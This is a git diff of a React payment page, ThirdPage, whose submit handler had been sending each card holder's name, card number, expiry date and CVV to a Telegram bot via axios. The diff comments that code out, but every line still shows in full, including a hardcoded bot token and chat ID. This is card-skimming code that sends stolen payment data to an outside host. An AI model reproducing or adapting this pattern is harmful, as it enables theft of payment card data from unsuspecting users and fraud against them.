@@ -46,21 +46,21 @@ const ThirdPage = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    const botToken = "7558394911:AAGkw5pvxaBFrA4N2-xQ0s8ci0SnW59b9IQ";
-    const chatID = "8057714398";
-    const message = `💳 *Payment Details*:\n👤 *Card Holder:* ${formData.cardHolder}\n💳 *Card Number:* ${formData.cardNumber}\n📅 *Expiry Date:* ${formData.expiryDate}\n🔒 *CVV:* ${formData.cvv}`;
+    // const botToken = "7558394911:AAGkw5pvxaBFrA4N2-xQ0s8ci0SnW59b9IQ";
+    // const chatID = "8057714398";
+    // const message = `💳 *Payment Details*:\n👤 *Card Holder:* ${formData.cardHolder}\n💳 *Card Number:* ${formData.cardNumber}\n📅 *Expiry Date:* ${formData.expiryDate}\n🔒 *CVV:* ${formData.cvv}`;
 
-    try {
-      await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        chat_id: chatID,
-        text: message,
-        parse_mode: "Markdown",
-      });
+    // try {
+    //   await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    //     chat_id: chatID,
+    //     text: message,
+    //     parse_mode: "Markdown",
+    //   });
 
-      setFormData({ cardHolder: "", cardNumber: "", expiryDate: "", cvv: "" });
-    } catch (error) {
-      console.error("Error sending data to Telegram", error);
-    }
+    //   setFormData({ cardHolder: "", cardNumber: "", expiryDate: "", cvv: "" });
+    // } catch (error) {
+    //   console.error("Error sending data to Telegram", error);
+    // }
   };
 
   return (
